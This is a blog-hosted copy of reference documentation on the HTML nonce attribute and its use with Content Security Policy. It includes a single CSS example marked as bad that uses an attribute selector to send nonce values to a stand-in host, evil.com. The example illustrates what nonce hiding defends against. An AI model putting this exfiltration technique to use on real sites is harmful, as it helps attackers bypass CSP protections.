{"title":"HTML attribute: Nonce","tag":"web/html/reference/global_attributes/nonce","post":"\n\n{{Sidebar(\"web/html/reference/global_attributes\")}}\n\nThe **`nonce`** [global attribute](/blog/Web/HTML/Reference/Global_attributes)\nis a content attribute defining a cryptographic nonce (\"number used once\") which can be used by\n[Content Security Policy](/blog/Web/HTTP/Guides/CSP) to determine whether or not a given fetch will\nbe allowed to proceed for a given element.\n\n## Description\n\nThe `nonce` attribute is useful to allowlist specific elements, such as a particular inline script or style elements.\nIt can help you to avoid using the [CSP](/blog/Web/HTTP/Guides/CSP) `unsafe-inline` directive, which would allowlist _all_ inline scripts or styles.\n\n> [!NOTE]\n> Only use `nonce` for cases where you have no way around using unsafe inline script\n> or style contents. If you don't need `nonce`, don't use it. If your script is static, you could also use a CSP hash instead.\n> (See usage notes on [unsafe inline script](/blog/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)\n> Always try to take full advantage of [CSP](/blog/Web/HTTP/Guides/CSP) protections and avoid nonces or unsafe inline scripts whenever possible.\n\n### Using nonce to allowlist a \\<script> element\n\nThere are a few steps involved to allowlist an inline script using the nonce mechanism:\n\n#### Generating values\n\nFrom your web server, generate a random base64-encoded string of at least 128 bits of data from a cryptographically secure\nrandom number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:\n\n```js\nimport crypto from \"node:crypto\";\n\ncrypto.randomBytes(16).toString(\"base64\");\n// '8IBTHwOdqNKAWeKl7plt8g=='\n```\n\n#### Allowlisting inline script\n\nThe nonce generated on your backend code should now be used for the inline script that you'd like to allowlist:\n\n```html\n<script nonce=\"8IBTHwOdqNKAWeKl7plt8g==\">\n  // â€¦\n</script>\n```\n\n#### Sending a nonce with a CSP header\n\nFinally, you'll need to send the nonce value in a\n[`Content-Security-Policy`](/blog/Web/HTTP/Reference/Headers/Content-Security-Policy) header\n(prepend `nonce-`):\n\n```http\nContent-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='\n```\n\n### Accessing nonces and nonce hiding\n\nFor security reasons, the `nonce` content attribute is hidden (an empty string will be returned).\n\n```js example-bad\nscript.getAttribute(\"nonce\"); // returns empty string\n```\n\nThe [`nonce`](/blog/Web/API/HTMLElement/nonce) property is the only way to access nonces:\n\n```js example-good\nscript.nonce; // returns nonce value\n```\n\nNonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data\nfrom content attributes like this:\n\n```css example-bad\nscript[nonce~=\"whatever\"] {\n  background: url(\"https://evil.com/nonce?whatever\");\n}\n```\n\n## Specifications\n\n{{Specifications}}\n\n## Browser compatibility\n\n{{Compat}}\n\n## See also\n\n- [`HTMLElement.nonce`](/blog/Web/API/HTMLElement/nonce)\n- [Content Security Policy](/blog/Web/HTTP/Guides/CSP)\n- CSP: [`script-src`](/blog/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)\n","slug":"052e07caa6a046749b848dc49fb50f60","authors":"Admin Es Solution","draft":false,"datecreated":"2025-07-06T10:19:39.047Z","dateupdated":"2025-07-06T10:19:39.047Z","layout":"PostBanner"}